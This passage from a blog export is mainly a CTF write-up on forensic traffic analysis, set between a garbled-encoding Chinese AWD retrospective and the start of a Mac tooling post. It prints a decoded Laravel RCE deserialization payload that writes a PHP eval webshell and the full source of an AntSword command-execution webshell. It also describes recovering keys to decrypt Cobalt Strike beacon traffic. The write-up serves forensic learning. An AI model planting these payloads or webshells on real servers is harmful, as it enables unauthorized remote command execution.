æ”¹è¿›1.æé«˜è„šæœ¬ç¼–å†™èƒ½åŠ›ï¼ŒæŒæ¡å¤šçº¿ç¨‹ï¼Œä¼˜åŒ–è„šæœ¬ç»“æ„ 2.åœ¨AWDæ¼”ç»ƒä¸­å°è¯•ä½¿ç”¨RCEæ¼æ´ç§æ¤ä¸æ­»é©¬å¹¶getflagã€‚ 3.æœ¬åœ°éƒ¨ç½²AOIAWD 4.crontabè·¯å¾„ç†Ÿè®°ï¼Œé˜²æ­¢æœ‰äººå†™crontabã€‚ 5.æ¨¡æ‹Ÿæ—¶ä¸¥æ ¼æ¼”ç»ƒæµç¨‹ï¼Œä¼˜åŒ–åˆ†å·¥ã€‚ 6.åº”æ­£ç¡®å¯¹å¾…é˜Ÿå‹ï¼Œå…‹åˆ¶è‡ªå·±çš„æƒ…ç»ªã€‚ æ€»ç»“è¿™æ¬¡æˆ‘æœ‰ç‚¹æ‹‰è·¨ï¼Œä¸è¿‡é˜Ÿå‹çš„è¡¨ç°å¾ˆå¥½ï¼Œèƒ½å„å¸å…¶èŒçš„è´Ÿè´£æˆ‘æ‰€åˆ†é…çš„è®¤ä¸ºï¼ˆæµé‡ã€èµ›é¢˜ç›‘æ§ã€å¤‡ä»½ä¸æ¢å¤ã€æ€æ¯’ã€æµé‡å‘Šè­¦ç­‰ï¼‰æˆ‘è®¤ä¸ºæˆ‘çš„é˜Ÿå‹ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹AWDèƒ½åšåˆ°è¿™ç§ç¨‹åº¦æ¯”æˆ‘å¼ºå¤ªå¤šäº†ã€‚ä¸‹æ¬¡AWDä¸€å®šæ‹¿ä¸‹ï¼","categories":[],"tags":[]},{"title":"Traffic analysis in Lvcheng Cup","slug":"Traffic-analysis-in-Lvcheng-Cup","date":"2021-10-09T02:59:51.000Z","updated":"2021-10-09T07:43:36.960Z","comments":true,"path":"2021/10/09/Traffic-analysis-in-Lvcheng-Cup/","link":"","permalink":"https://polosec.github.io/2021/10/09/Traffic-analysis-in-Lvcheng-Cup/","excerpt":"","text":"IntroductionTarget: FIND THE FLAG(hint : AntSwort traffic) Personally I think this problem is challenging for me,it contains Cobalt Strike traffic analysis, laravel Rce traffic analysis and AntSwort traffic analysis. AntSword and Laravel RCE Traffic AnalysisThere are many packets in the pcap file,personally Iâ€™â€™ll use http.request.method==POST to filter http traffic beacuse most of webshell are use post method sends data to victims.Obviously there are too many packets contains ignition field, after googling, I found that this is Laravel RCE explotiation. Following figure shows that .config.php were frequently requested ,follow it in HTTP stream, obviously the webshell executed ls command. node1Keep following requests which connnected to config.php,we can find a pacaket made an extract operation and the file name is secret.zip,this file is suspicious and it should be recovered .After extarcing HTTP objects I havenâ€™t find secret.zip,so keep following packets. node1 endIn a packet we find PK filed in response data,so it should be recovered with zip file format.There is one thing to note,in the start and end postions of response data exists hex data,AntSword added it to reduce traffic character. Use 010 editor to recover this file ,then open it, but it tips me password are required,now I didnâ€™t find any passwords,after fix ,check and broute tools I still canâ€™t open it.So I have to find the password.We can find that the secret file is .cobaltstrike.beacon_keys file ,itâ€™s serialized file contains public and private key.If we can crack the password and recover private key, the ciphertext between hacker and coblatstrike teamserver will be cracked. In node 1 we find an extract command were executed, so next setp is recover webshell contents and know the exact command, it must contains exact password.The webshell were written by Laravel RCE, so we should find what hacker did via Laravel RCE exploitation. 1P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00 Replacing =00 to null then base64 decode it, we can get the webshell contents. 12&lt;?php __HALT_COMPILER(); ?&gt; \u0002\u0002\u0011\u0001ï¿½\u0001a:2:&#123;i:7;O:32:&quot;Monolog\\Handler\\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\\Handler\\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;\u0005dummy\u0004\\KKa\u0004 ~Ø¶\u0001\btest.txt\u0004\\KKa\u0004 ~Ø¶\u0001testtest6z&#x3D;Jcï¿½Fï¿½ï¿½ØİŒ&amp;~ï¿½&lt;@ï¿½ï¿½\u0002GBMB are webshell.We can decode traffic after base64 and gzip decode. 1234514433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4Fb430b310838a93&#x3D;4gf861d394170244&#x3D;X4Y21kufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm Above encryped data are webshell commands which executing extract zip file,decode it with base64 and gzip, we can get the source code of server send to client. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);if($opdir) &#123; $ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir); @array_push($oparr,$ocwd,sys_get_temp_dir()); foreach($oparr as $item) &#123; if(!@is_writable($item)) &#123; continue; &#125; ; $tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;; @mkdir($tmdir); if(!@file_exists($tmdir)) &#123; continue; &#125; @chdir($tmdir); @ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\\\\\|\\&#x2F;&#x2F;&quot;,$tmdir); for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123; @chdir(&quot;..&quot;); &#125; ; @ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;); @rmdir($tmdir); break; &#125; ;&#125;;;function asenc($out) &#123; return $out;&#125;;function asoutput() &#123; $output&#x3D;ob_get_contents(); ob_end_clean(); echo &quot;36&quot;.&quot;4f2&quot;; echo @asenc($output); echo &quot;42&quot;.&quot;ff1&quot;;&#125;ob_start();try &#123; $p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2)); $s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2)); $envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2)); $d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;&#x2F;c \\&quot;&#123;$s&#125;\\&quot;&quot;; if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123; @putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;); &#125; else &#123; @putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;); &#125; if(!empty($envstr)) &#123; $envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr); foreach($envarr as $v) &#123; if (!empty($v)) &#123; @putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v)); &#125; &#125; &#125; $r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;; function fe($f) &#123; $d&#x3D;explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;)); if(empty($d)) &#123; $d&#x3D;array(); &#125; else &#123; $d&#x3D;array_map(&#39;trim&#39;,array_map(&#39;strtolower&#39;,$d)); &#125; return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d)); &#125; ; function runshellshock($d, $c) &#123; if (substr($d, 0, 1) &#x3D;&#x3D; &quot;&#x2F;&quot; &amp;&amp; fe(&#39;putenv&#39;) &amp;&amp; (fe(&#39;error_log&#39;) || fe(&#39;mail&#39;))) &#123; if (strstr(readlink(&quot;&#x2F;bin&#x2F;sh&quot;), &quot;bash&quot;) !&#x3D; FALSE) &#123; $tmp &#x3D; tempnam(sys_get_temp_dir(), &#39;as&#39;); putenv(&quot;PHP_LOL&#x3D;() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;); if (fe(&#39;error_log&#39;)) &#123; error_log(&quot;a&quot;, 1); &#125; else &#123; mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;); &#125; &#125; else &#123; return False; &#125; $output &#x3D; @file_get_contents($tmp); @unlink($tmp); if ($output !&#x3D; &quot;&quot;) &#123; print($output); return True; &#125; &#125; return False; &#125; ; function runcmd($c) &#123; $ret&#x3D;0; $d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if(fe(&#39;system&#39;)) &#123; @system($c,$ret); &#125; elseif(fe(&#39;passthru&#39;)) &#123; @passthru($c,$ret); &#125; elseif(fe(&#39;shell_exec&#39;)) &#123; print(@shell_exec($c)); &#125; elseif(fe(&#39;exec&#39;)) &#123; @exec($c,$o,$ret); print(join(&quot;&quot;,$o)); &#125; elseif(fe(&#39;popen&#39;)) &#123; $fp&#x3D;@popen($c,&#39;r&#39;); while(!@feof($fp)) &#123; print(@fgets($fp,2048)); &#125; @pclose($fp); &#125; elseif(fe(&#39;proc_open&#39;)) &#123; $p &#x3D; @proc_open($c, array(1 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;), 2 &#x3D;&gt; array(&#39;pipe&#39;, &#39;w&#39;)), $io); while(!@feof($io[1])) &#123; print(@fgets($io[1],2048)); &#125; while(!@feof($io[2])) &#123; print(@fgets($io[2],2048)); &#125; @fclose($io[1]); @fclose($io[2]); @proc_close($p); &#125; elseif(fe(&#39;antsystem&#39;)) &#123; @antsystem($c); &#125; elseif(runshellshock($d, $c)) &#123; return $ret; &#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123; $w&#x3D;new COM(&#39;WScript.shell&#39;); $e&#x3D;$w-&gt;exec($c); $so&#x3D;$e-&gt;StdOut(); $ret.&#x3D;$so-&gt;ReadAll(); $se&#x3D;$e-&gt;StdErr(); $ret.&#x3D;$se-&gt;ReadAll(); print($ret); &#125; else &#123; $ret &#x3D; 127; &#125; return $ret; &#125; ; $ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;); print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;; ;&#125;catch(Exception $e) &#123; echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); We can see that parameter s receive parameter ufbd335828f30fâ€™s value. 1$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2)); so, s= /d \"D:\\\\phpstudy_pro\\\\WWW\\\\secret\"&\"C:\\Program Files\\7-Zip\\7z.exe\" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f1 The password was found,P4Uk6qkh6Gvqwg3y.Then extract beacon_keys file.We can recover serialized private key by https://github.com/WBGlIl/CS_Decrypt. From RSA key we can recover AES key in traffic ,usually the encryped data located in cookie field. From AES key we can recover totally communication contents,according to cobalt strike traffic characetristics,we can get beaconâ€™s task execution results from the pacakage which POST DATA to submit.php?id=xxx. Note that data should be base64 format,then use script decode it. So beaconâ€™s task execution result were shown in above figure, it contains the flag what we want. Referencehttps://blog.csdn.net/qq_43264813/article/details/120560209 https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuan https://www.wkr.moe/ctf/610.html#toc-head-3","categories":[],"tags":[],"author":"Polo"},{"title":"Quick start  Captfencoder in Mac","slug":"Quick-start-Captfencoder-in-Mac","date":"2021-10-08T07:35:41.000Z","updated":"2021-10-09T02:44:06.623Z","comments":true,"path":"2021/10/08/Quick-start-Captfencoder-in-Mac/","link":"","permalink":"https://polosec.github.io/2021/10/08/Quick-start-Captfencoder-in-Mac/","excerpt":"","text":"ToolsAutomator in macopen automator,choose application,search shell on the topthen type 1export 